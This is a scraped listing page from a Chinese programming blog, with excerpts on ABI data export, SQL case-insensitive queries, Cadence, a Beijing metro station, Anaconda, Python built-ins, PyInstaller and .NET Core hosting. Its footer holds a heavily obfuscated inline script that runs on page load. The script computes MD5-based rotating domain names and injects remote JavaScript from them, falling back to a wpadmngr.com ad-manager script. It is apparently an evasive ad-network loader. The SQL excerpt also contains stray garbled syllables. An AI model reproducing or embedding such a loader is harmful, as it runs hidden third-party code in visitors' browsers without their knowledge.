			iview导出部分数据_学会用这个导出单组件功能，你就是数据分析大神
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		情景：
客户A：最近头好大啊！
小亿：怎么了？是什么事让你烦心了啊？
客户A：最近，公司产品需要做一篇关于公司产品使用反馈情况数据的微信推文，分析出的图表是我现在想要的数据，我们现在的系统以及excel无法实现对单一元素的导出，我也无计可施，唉！
小亿：不用担心啦，我们的ABI分析报表给我们提供了导出单独报表的功能，以后分析出的表，你想单独导出都可以的啦！跟我来，我给你介绍。
亿信ABI作为亿信华辰自主研发的一款全能型数据分析产品，不论是导入数据、构建数据仓库，还是制作各类分析展现、数据挖掘等，设计过程完全可视化。ABI遵循便捷易用的设计理念，所有操作无需定义复杂公式，仅需拖拉拽即可快速完成设计，零门槛、上手快。
客户在使用功能强大的亿信ABI制作比较复杂的分析报表之后，需要将指定的表格数据或统计图数据导出，就可以使用我们导出单组件功能进行单独导出。组件是ABI报表界面定义的分析元素，如：表格，统计图，图片等，导出单组件是将我们在ABI报表中进行分析过后的单个元素进行导出，他可以将指定数据导出为Excel，作为分析数据展示。相对于直接将整个报表结果导出为excel来说，导出单组件可以随心所欲的导出需要的报表部分，剔除不需要的内容。让我们看看如何导出单个组件内容。
1、选择需要导出的报表点击计算，进入报表结果页面。
2、例如：我们需要将右侧统计图导出。点击工具栏中左侧“报表”选项，选择“导出单组件”。
在选择单组件的弹窗中选择要导出的统计图之后，选中后，背后结果页面会有明显的红框标识。
3.点击“下一步”，填写文件名称，以及选择导出的格式，点击“确定”就可以将导出的数据进行下载
打开下载的excel，可以看到tab页组件内所有的内容都被完整的导出了。
跟着这个步骤自己操作一遍，马上就能学会这个常用的导出单组件功能，不再为导出数据烦恼，既实用又简单！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f8102cbc317178932cc887736c0a7095/" rel="bookmark">
			sql语句查询字母字段时不区分大小写（建表时默认大写）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		sql语句查询字母字段时不区分大小写 要用sql语句查询它的时候我要查询的字段不区分大小写所有都查出来，sql语句要怎么写
||第一种bai方法
like '%g%' 改成 like ‘du%'||upper(条件zhi)||‘%’
第二dao种方法
like UPPER('%g%' );
不过第二种方法 不好写 因为你的 g 可能是条件 不是固定的参zhuan数
select * from gzjdczb_db_links where username like binary '%g%' or username like binary '%G%';
upper()是把username转化为大写的，lower()是转化为小写的；
建议所有字段默认后台改写为大写，输入查询语句的时候就可以很方便，不用切换大小写，免得遇到一些报错！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b81d11a497f89c8b91b18cb47c6858f1/" rel="bookmark">
			2021-01-06 cadence17 系列配合 LP wizard 10.5 进行自动绘制控件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		cadence 17 无法自动的原因 由于 17 之后启用的 pad 编辑器指令发生的变化
操作步骤 1 正常操作 2 设置 pad 这里可以选择手动启动 pad 生成对应的 pad， 也可以修改脚本
bat 脚本在你指定的位置，也就是上图 Script file directory 内填入的内容，双击运行
3 保存 pad 使用脚本中的名字，放置到 Script file directory 目录内容 其余部分，关闭 pad editor 之后程序会正常继续运行。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d0a57319c398b2c0316167d361d5ab5c/" rel="bookmark">
			13号线ab线规划图_13号线新增的这一站年底开通
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		望京网(微信号：wangjingshequ)接受广大网友各类求助、曝光、投诉、表扬、建议等的投稿，随时推送望京的新鲜事儿！
地铁出行一直是大家关心的话题，去年底13号线的拆分就引起了广泛的关注。(详情请见望京网此前报道：重磅！地铁13号线拆分成AB两段，影响你的出行！)
地铁13号线的线路调整与京张高铁工程有关，在京张高铁清河站建成之后，现有的地铁13号线线路将进行微调，为高铁“让路”，并在西二旗站与上地站之间新增一个“清河站”，届时地铁列车将可以直接开进清河站内，并在平行于京张高铁4个站台的位置增设站台。
作为13号线的新增车站，也是与京张铁路的换乘点，13号线清河站的命名预案8月29日开始在市规划和自然资源委员会官网公示。
13号线清河站示意图
市规划和自然资源委员会表示，13号线增设的清河站将于今年年底与京张铁路的火车站同步开通。
轨道交通13号线清河站工程是京张铁路清河火车站及周边交通设施综合交通枢纽的组成部分。该站周边聚集着大量企业和居住小区，公共交通的出行需求强烈。
今后，地铁13号线将增设清河站，方便周边出行。而且清河综合交通枢纽位既是服务2022年冬奥会的京张铁路始发站之一，又是承担着多种交通的运行和转乘功能，集高速铁路、地铁昌平线、19号线支线、13号线和市政工程于一体的大型城市综合交通枢纽。
去年11月，13号线拆分的规划方案公示，其中也明确，在13A线上设置清河站。
今年上半年，地铁13号线改线拨接工程启动。地铁13号线西段停运7天，停运期间13号线“挪轨”至国铁清河交通枢纽。为13号线增设清河站奠定了基础。
清河站年底开通后，对于北部清河地区居民的出行，无疑是重大的利好消息。
根据市规划委的公示，清河站位于海淀区清河街道，京张铁路清河站内。因清河火车站得名。
拆分13号线新增清河站，是否方便了您的出行呢？欢迎在留言区讨论。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/312d14fcdb0e45bfc3e7473c6830563e/" rel="bookmark">
			anaconda必须安装在c盘吗_windows安装Anaconda3
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本教程教大家在windows10里面安装Anaconda3，过程简单，无论实在windows7还是windows10，安装过程一致。
下载Anaconda3 进入Anaconda官网，点击右上角download
下拉选择windows版本，点击下载
安装Anaconda3 1、双击打开下载好的安装包，点击NEXT
2、点击I Agree,表示同意上述协议
3、选择只能对自己使用，还是对所有的计算机用户使用，这里是我自己使用，选择第一个选项，点击NEXT
4、选择安装位置，一般不要装在C盘，然后点击NEXT
5、这里一般选择第二项，第一项意思是把Anaconda添加到环境变量，这样可以在终端启动，一般不选择此项，容易和其它软件发生冲突，第二个是把anaconda自带的python解释器作为默认解释器，这个可以勾选上，然后点击install，安装完成即可
6、安装完成后，在桌面或者左下角windows开始界面最近添加里面找到anaconda启动器，打开即可使用
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4ac4d07332d283991f759b7f7496a1bf/" rel="bookmark">
			【Python基础】Python初学者必须吃透这69个内置函数！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		所谓内置函数，就是Python提供的, 可以直接拿来直接用的函数，比如print，enumerate、format等。Python内置的这些函数非常精巧且强大的，对初学者来说，经常会忽略，但是偶尔会碰到，我也是用了一段时间python之后才发现，哇还有这么好的函数，每个函数都非常经典，而且经过严格测试，使用内置函数，不用自己闭门造车，并且代码简洁易读了很多，真是方便又实用，值得花时间进行体系化研究学习。
初学者的代码之所以写的不简洁，不是因为学的不够好，而是学的不够多，很多内置的东西都没学透。
abs()
delattr()
hash()
memoryview()
set()
all()
dict()
help()
min()
setattr()
any()
dir()
hex()
next()
slice()
ascii()
divmod()
id()
object()
sorted()
bin()
enumerate()
input()
oct()
staticmethod()
bool()
eval()
int()
open()
str()
breakpoint()
exec()
isinstance()
ord()
sum()
bytearray()
filter()
issubclass()
pow()
super()
bytes()
float()
iter()
print()
tuple()
callable()
format()
len()
property()
type()
chr()
frozenset()
list()
range()
vars()
classmethod()
getattr()
locals()
repr()
zip()
compile()
globals()
map()
reversed()
__import__()
complex()
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4ac4d07332d283991f759b7f7496a1bf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b52155ad63fa54dacbf1cc005b670b2c/" rel="bookmark">
			Pyinstaller的Spec文件用法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Pyinstallerd的应用记录 前言SPEC打包SPEC内容说明 一些实际应用的问题关于动态加载的module导入问题直接在spec中声明通过hook脚本导入 runtime_hooks参数的使用打包后exe无法运行的问题管理员权限问题部分PC无法使用 加密问题 前言 当我们用py完成一些功能，可以通过Pyinstaller将源码打包成exe来独立运行，用户使用时只需要执行这个exe文件即可，不需要在机器上再安装Python及其他包就可运行了。（理论上，后面会附加一些我自己实际运用时遇到的一些问题）
Pyinstaller打包方式一般分为 直接输入指令 和 利用spec文件进行打包。由于直接输入指令实际就是根据指令生成spec文件，再根据spec文件的内容进行打包操作，所以一下重点说明spec文件的内容，结尾处附上指令以供参考。
SPEC打包 第一步当然是最基础的用法，我们先创建一个main.py作为启动脚本。在控制台输入
pyinstaller [-F/-D] [-w/-c] [-i xxx.ico] main.py 我们可以发现路径下多了main.spec文件。后续我们可以修改spec文件里的内容，然后输入指令来进行打包操作了
pyinstaller main.spec 后续打包的参数越来越多，每次输入一大堆参数显然不如直接使用spec来的高效，所以尽量使用spec文件进行打包操作。
SPEC内容说明 下图就是对一个main.py进行打包时，默认生成的spec文件，我们来看下每个参数表示的含义
变量含义aAnalysis类的实例，要求传入各种脚本用于分析程序的导入和依赖。a中内容主要包括以下四部分：scripts，即可以在命令行中输入的Python脚本；pure，程序代码文件中的纯Python模块，包括程序的代码文件本身；binaries，程序代码文件中需要的非Python模块，包括–add-binary参数指定的内容；datas，非二进制文件，包括–add-data参数指定的内容。pyzPYZ的实例，是一个.pyz文件，包含了所有pure中的所有Python模块。exeEXE类的实例，这个类是用来处理Analysis和PYZ的结果的，也是用来生成最后的exe可执行程序。collCOLLECT类的实例，用于创建输出目录。在-F模式下，是没有COLLECT实例的，并且所有的脚本、模块和二进制文件都包含在了最终生成的exe文件中。block_cipher加密密钥 以上内容中 修改比较多的是a、exe的内容，coll和pyz基本没有遇到需要修改的情况。
参数含义Analysis参数scripts也是第一个参数，它是一个脚本列表，可以传入多个py脚本，效果与命令行中指定多py文件相同，即py文件不止一个时，比如“pyinstaller xxx1.py xxx2.py”，pyinstaller会依次分析并执行，并把第一个py名称作为spec和dist文件下的文件夹和程序的名称Analysis参数pathex默认有一个spec的目录，当我们的一些模块不在这个路径下，记得把用到的模块的路径添加到这个list变量里。同命令“-p DIR/–paths DIR”.Analysis参数datas作用是将本地文件打包时拷贝到目标路径下。datas是一个元素为元组的列表，每个元组有两个元素，都必须是字符串类型，元组的第一个元素为数据文件或文件夹，元组的第二个元素为运行时这些文件或文件夹的位置。例如：datas=[(’./src/a.txt’, ‘./dst’)]，表示打包时将"./src/a.txt"文件添加（copy）到相对于exe目录下的dst目录中。也可以使用通配符：datas= [ (’/mygame/sfx/*.mp3’, ‘sfx’ ) ]，表示将/mygame/sfx/目录下的所有.mp3文件都copy到sfx文件夹中。也可以添加整个文件夹：datas= [ (’/mygame/data’, ‘data’ ) ]，表示将/mygame/data文件夹下所有的文件都copy到data文件夹下。同命令“–add-data”。Analysis参数binaries添加二进制文件，也是一个列表，定义方式与datas参数一样。没具体使用过。同命令“–add-binary”。Analysis参数hiddenimports指定脚本中需要隐式导入的模块，比如在__import__、imp.find_module()、exec、eval等语句中导入的模块，这些模块PyInstaller是找不到的，需要手动指定导入，这个选项可以使用多次。同命令“–hidden-import MODULENAME/–hiddenimport MODULENAME”。Analysis参数hookspath指定额外hook文件（可以是py文件）的查找路径，这些文件的作用是在PyInstaller运行时改变一些Python或者其他库原有的函数或者变量的执行逻辑（并不会改变这些库本身的代码），以便能顺利的打包完成，这个选项可以使用多次。同命令“–additional-hooks-dir HOOKSPATH”。Analysis参数runtime_hooks指定自定义的运行时hook文件路径（可以是py文件），在打好包的exe程序中，在运行这个exe程序时，指定的hook文件会在所有代码和模块之前运行，包括main文件，以满足一些运行环境的特殊要求，这个选项可以使用多次。同命令“–runtime-hook RUNTIME_HOOKS”。Analysis参数excludes指定可以被忽略的可选的模块或包，因为某些模块只是PyInstaller根据自身的逻辑去查找的，这些模块对于exe程序本身并没有用到，但是在日志中还是会提示“module not found”，这种日志可以不用管，或者使用这个参数选项来指定不用导入，这个选项可以使用多次。同命令“–exclude-module EXCLUDES”。exe参数console设置是否显示命令行窗口，同命令-w/-c。exe参数icon设置程序图标，默认spec是没有的，需要手动添加，参数值就是图片路径的字符串。同命令“命令-i/–icon”。 一些实际应用的问题 关于动态加载的module导入问题 有些脚本中，我们使用了__import__等一些动态导入库的函数时，pyinstaller打包是无法找到这些模块的，在使用时就会报"ImportError 找不到指定模块"，这个时候就需要手动导入动态加载的模块。
在以下结构中,我们__import__(‘A.AA’)
A AA AAAAAB AB ABAABB 直接在spec中声明 在"Analysis参数hiddenimports"中添加需要导入模块,hiddenimports=[‘A.AA’]。
通过hook脚本导入 1.在spec中，使hiddenimports=[‘A’]，
2.名称按照"hooks-xxx.py"的方式创建一个脚本，此时我们创建一个"hooks-A.py"， 脚本的主要内容为给"hiddenimports"这个list赋值,可以直接赋值，也可以写逻辑（完全可以看成一个py脚本）。
hiddenimports = ['A','A.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b52155ad63fa54dacbf1cc005b670b2c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5c129e8709b9996c6269f1391988e1e0/" rel="bookmark">
			关于 .NET Core 中的 Host
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言一、将托管服务寄宿在 Host 上二、在服务注册对象中注册服务三、使用配置和选项服务1. 添加配置2. 选项服务 四、将日志功能添加到 Host 中五、HostApplicationLifetime 的简单使用总结 前言 当前文章用的 .NET Core SDK 3.1。
ASP.NET Core 应用程序本质上是一个服务，这个服务启动了一个网络监听器，当监听器监听到Http请求以后，将请求传递给应用的管道进行处理，完成处理后生成Http响应。
长时间运行的服务需要寄宿在托管进程中，提供了这个功能的系统称为 Host，Host 实现的功能将一个或多个长时间运行的服务给寄宿的托管进程中，并由 Host 来管理长时间运行的服务，这些服务被称为托管服务。
任何需要在后台长时间运行的程序，我们都可以按照标准把他定义为托管服务将其寄宿在 Host 上面。
一、将托管服务寄宿在 Host 上 托管服务需要实现 IHostedService，程序启动时，Host 才会自动找到注册的所有托管服务并将他们启动。
需要引入相关的NuGet包： dotnet add package Microsoft.Extensions.Hosting -v 3.1.10
这里定义了一个时钟，用来打印当前时间。
public class SystemClock : IHostedService { private Timer _timer; public Task StartAsync(CancellationToken cancellationToken) { _timer = new Timer(state =&gt; { Console.WriteLine($"Current Time:{DateTime.Now:yyyy-MM-dd HH:mm:ss}"); }, null, 0, 1000); return Task.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5c129e8709b9996c6269f1391988e1e0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/686032cafa30fd08f2401beed5faa87c/" rel="bookmark">
			全屏 标签_web开发：全屏滚动插件fullpage.js
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文同步发表在我的个人博客中：
沧沧凉凉​www.cclliang.com 随着前端的飞速发展，现在制作界面时出现了非常多的好看的样式，比如说全屏滚动效果，能够带来很舒服的视觉体验。先来看一下什么是全屏滚动：
这是fullpage.js的官网，只需要滑动一下滚轮，就能实现翻页的效果。
安装 fullPage.js中文文档​github.com 如何安装其实文档上面已经说得很清楚了，即：
// 使用 bower bower install fullpage.js // 使用 npm npm install fullpage.js 包含文件：
&lt;link rel="stylesheet" type="text/css" href="fullpage.css" /&gt; &lt;!-- 以下行是可选的。 只有在使用选项 css3:false ，并且您希望使用其他缓动效果，而非 linear 、 swing 或 easeInOutCubic 时才有必要。 --&gt; &lt;script src="vendors/easings.min.js"&gt;&lt;/script&gt; &lt;!-- 以下行仅在使用选项 scrollOverflow:true 的情况下是必需的 --&gt; &lt;script type="text/javascript" src="vendors/scrolloverflow.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript" src="fullpage.js"&gt;&lt;/script&gt; 因为现在的单页面应用几乎都是使用的webpack打包工具，所以直接看一下webpack怎么引入，如果有使用其它工具，可以直接到下面的网址进行查看如何引入。
https://github.com/alvarotrigo/fullPage.js/wiki/Use-module-loaders-for-fullPage.js​github.com // Optional. When using fullPage extensions //import scrollHorizontally from './fullpage.scrollHorizontally.min'; // Optional. When using scrollOverflow:true //import IScroll from 'fullpage.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/686032cafa30fd08f2401beed5faa87c/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/391/">«</a>
	<span class="pagination__item pagination__item--current">392/578</span>
	<a class="pagination__item pagination__item--next btn" href="/page/393/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>